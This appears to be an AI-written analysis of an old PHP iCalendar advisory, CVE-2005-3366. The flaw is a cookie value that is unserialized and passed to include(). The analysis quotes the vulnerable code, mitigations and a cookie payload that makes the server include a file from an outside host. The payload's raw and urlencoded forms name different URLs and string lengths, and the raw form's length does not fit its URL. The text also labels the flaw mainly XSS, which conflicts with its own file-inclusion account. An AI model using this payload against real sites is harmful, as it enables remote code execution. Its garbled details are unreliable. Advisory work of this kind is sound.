Based on the provided content, here's an analysis of the vulnerability:

**CVE ID:** CVE-2005-3366 (Based on the content from marc.info, this vulnerability was later assigned CVE-2005-3366)

**Root Cause:** The vulnerability stems from a lack of input validation when processing the `phpicalendar` cookie in `index.php`. The application unserializes data from the cookie and uses a value from it (`cookie_view`) to construct a filename that is then included.

**Weaknesses/Vulnerabilities Present:**
* **Cross-Site Scripting (XSS):** The primary vulnerability is XSS, achieved by injecting malicious code through the crafted cookie.
* **Arbitrary File Inclusion:** By manipulating the `cookie_view` value, an attacker can force the application to include a file of their choosing. This is because the value is concatenated with `.php` and then directly included.

**Impact of Exploitation:**
* An attacker can inject arbitrary code into the application.
* This can lead to session hijacking, defacement of the site, and other malicious activities.
* Since the included file is not validated, an attacker could potentially include a file from a remote location or local.

**Attack Vectors:**
* **HTTP Cookie Manipulation:** The attack is carried out by crafting a malicious `phpicalendar` cookie.
* **Serialized Data Injection:** The attacker injects a specially crafted serialized array into the cookie which contains malicious URL
* **Include function:** The application then takes this data from cookie, creates a path to a file with `.php` and executes it.

**Required Attacker Capabilities/Position:**
* The attacker needs the ability to send a crafted HTTP request containing the malicious cookie to the target server.
* No prior authentication or special permissions are needed.

**Technical Details:**
* Vulnerable code snippet:
```php
if (isset($_COOKIE['phpicalendar'])) {
 $phpicalendar = unserialize(stripslashes($_COOKIE['phpicalendar']));
 $default_view = $phpicalendar['cookie_view'];
}

if ($printview_default == 'yes') {
 $printview = $default_view;
 $default_view = "print.php";
} else {
 $default_view = "$default_view".".php";
}

include($default_view);
```
* Malicious cookie example: `a:1:{s:11:"cookie_view";s:23:"<http://www.mali.cious/script>";}` which gets urlencoded to `phpicalendar=a%3A1%3A%7Bs%3A11%3A%22cookie_view%22%3Bs%3A34%3A%22http%3A%2F%2Fwww.ush.it%2Fteam%2Fascii%2F-----%22%3B%7D`

**Affected Versions:**
* PHP iCalendar versions 2.0a2, 2.0b, 2.0c, and 2.0.1 are affected.

**Mitigation:**
* Input validation: The vendor was advised to implement input validation on the `cookie_view` value.
* Header redirection: Using a header location redirect instead of including the file was suggested as another method to fix this vulnerability.
* Remote file inclusion protection: Preventing PHP from accessing remote files, if such configuration was possible, would mitigate the vulnerability.

**Additional Notes:**
* The advisory mentions that the vendor fixed the bug in their CVS tree but this was not verified.
* The vulnerability was discovered and reported by Francesco 'aScii' Ongaro.
